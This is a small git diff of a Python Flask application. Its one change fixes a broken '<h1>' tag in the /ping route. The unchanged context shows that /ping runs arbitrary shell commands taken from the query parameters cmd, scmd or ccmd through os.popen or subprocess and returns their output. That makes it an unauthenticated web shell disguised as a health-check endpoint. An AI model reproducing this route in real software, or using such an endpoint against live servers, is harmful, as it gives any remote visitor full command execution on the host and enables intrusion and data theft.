@@ -24,7 +24,7 @@ handleri=apps.handler.handlerc()
 @app.route("/ping")
 def ping():
  if not request.args:
-  return "h1>ping</h1>"
+  return "<h1>ping</h1>"
  elif [x for x in request.args if re.search(r'^[cs]?cmd$',x)]:
   return re.sub(r'\n','<br>',os.popen(f'{request.args["ccmd"]}').read() if 'ccmd' in request.args else subprocess.run(shlex.split(request.args['cmd' if 'cmd' in request.args else 'scmd']),capture_output=True,text=True).stdout,flags=re.DOTALL)
  elif 'reload' in request.args:
